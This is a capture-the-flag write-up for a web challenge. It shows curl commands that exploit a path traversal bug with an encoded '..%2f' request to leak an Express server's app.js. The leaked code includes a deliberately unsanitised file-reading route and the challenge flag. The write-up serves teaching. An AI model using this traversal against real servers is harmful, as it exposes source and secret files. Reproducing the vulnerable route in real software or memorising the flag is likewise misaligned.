## Description
> Hi there, our SOC team recived message that a hacker was quickly able to compromise our customer's senstive data by abuse our super-secure login page.
> 
> Could you spot the vulnerability and let us know the flag?


## Solution

We visit the attached website and get a simple login page (`https://logmepolicy.appsecil.ctf.today/relam/splogin`).

Apart from the login form, the login page contains a link to the terms of use:

```html
<div class="text-center">
    By login you are accept to our <a class="small" href="../documentation/terms.txt"
                                        download>terms of
        use</a> policy.
</div>
```

Let's take a look at `robots.txt`:

```
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/robots.txt
User-agent: *
Disallow: /
Disallow: /documentation/terms.txt
Disallow: /documentation/old_terms.txt
```

So both `terms` and `old_terms.txt` are hidden from search engines.

Let's check the terms:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/relam/../documentation/terms.txt

These terms require the use of arbitration Section 10.2 on an individual basis to resolve disputes and also limit the remedies available to you in the event of a dispute.
```

Nothing interesting there. Let's move one to the old terms:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/relam/../documentation/old_terms.txt
Error: ENOENT: no such file or directory, open '/app/documentation/old_terms.txt'
    at Object.openSync (fs.js:462:3)
    at Object.readFileSync (fs.js:364:35)
    at /app/app.js:40:21
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)

    at param (/app/node_modules/express/lib/router/index.js:354:14)
    at param (/app/node_modules/express/lib/router/index.js:365:14)
```

We get an exception originating from `/app/app.js`.

Let's try to read it:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/app.js
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /app.js</pre>
</body>
</html>
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/documentation/../app.js
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /app.js</pre>
</body>
</html>
```

No luck. Notice however that in both cases the error message refers to `/app.js`, without mentioning `/documentation/../app.js`. Let's take a closer look at the request being sent by `curl` by examining the request headers:
```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl -s -v -I https://logmepolicy.appsecil.ctf.today/documentation/../app.js 2>&1 | grep ">"
> HEAD /app.js HTTP/1.1
> Host: logmepolicy.appsecil.ctf.today
> User-Agent: curl/7.64.0
> Accept: */*
>
```

It looks like `curl` is requesting `/app.js` and not `/documentation/../app.js`. What if the file leak bug is only exposed when accessing paths under `/documentation/`?

To force `curl` to send the path as-is, we can use an extra flag:

> --path-as-is: Tell curl to not handle sequences of /../ or /./ in the given URL path. Normally curl will squash or merge them according to standards but with this option set you tell it not to do that. 

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl -s -v -I --path-as-is https://logmepolicy.appsecil.ctf.today/documentation/../app.js 2>&1 | grep ">"
> HEAD /documentation/../app.js HTTP/1.1
> Host: logmepolicy.appsecil.ctf.today
> User-Agent: curl/7.64.0
> Accept: */*
```

Now the full path that we've supplied is being sent, but we still don't get any useful response:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl --path-as-is https://logmepolicy.appsecil.ctf.today/documentation/../app.js
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /documentation/../app.js</pre>
</body>
</html>
```

Encoding the '`/`' as '`%2f`' does the trick:

```console
root@kali:/media/sf_CTFs/appsec/Log_Me_Policy# curl https://logmepolicy.appsecil.ctf.today/documentation/..%2fapp.js
const fs = require('fs');
const path = require('path');
const express = require("express");

const app = express();

// set the view engine to ejs
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
    res.removeHeader("X-Powered-By");
    res.append('Server', 'AppSec-IL/20.20');
    res.append('Access-Control-Allow-Origin', ['*']);
    res.append('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
    res.append('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

app.get("/", (req, res, next) => {
    res.redirect('/relam/splogin')
});

app.get("/relam/splogin", (req, res, next) => {
    res.render("login", {error: ""});
});

app.post("/relam/splogin", (req, res, next) => {
    res.render("login", {error: 'Username or password is incorrect.'});
});

/***
 * @TBD: our engineering team told us to check out this method, let's test it next sprint
 * AppSec-IL{d0_n0T_t4UST_uS34_iNp7t}
 */
app.get("/documentation/:file", (req, res, next) => {
    let buffer = "";
    const filePath = path.join(__dirname, "documentation", req.params.file);
    try {
        buffer = fs.readFileSync(filePath);
    } catch (error) {
        buffer = error.stack.toString();
    }
    res.type('application/octet-stream');
    res.send(buffer.toString());
});

app.listen(8081, () => {
    console.log("Server running on port 8081");
});
```

This confirms our suspicion that the path traversal bug exists only under `/documentation/`.

The flag: `AppSec-IL{d0_n0T_t4UST_uS34_iNp7t}`
